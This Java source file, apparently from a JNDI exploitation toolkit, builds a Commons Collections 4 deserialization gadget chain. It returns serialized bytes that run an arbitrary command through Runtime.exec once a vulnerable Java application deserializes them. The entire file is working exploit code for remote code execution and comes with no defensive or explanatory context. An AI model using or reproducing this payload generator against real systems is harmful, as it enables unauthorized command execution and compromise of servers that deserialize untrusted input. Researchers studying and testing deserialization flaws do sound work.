package map.jndi.gadget;

import map.jndi.util.ReflectUtil;
import map.jndi.util.SerializeUtil;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsK4 {
    public static byte[] create(String cmd) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new ConstantTransformer(1));

        Map innerMap = new HashMap();
        Map m = LazyMap.lazyMap(innerMap, transformerChain);

        Map outerMap = new HashMap();
        TiedMapEntry tme = new TiedMapEntry(m, "v");

        outerMap.put(tme, "t");
        innerMap.clear();

        ReflectUtil.setFieldValue(transformerChain, "iTransformers", transformers);

        return SerializeUtil.serialize(outerMap);
    }
}
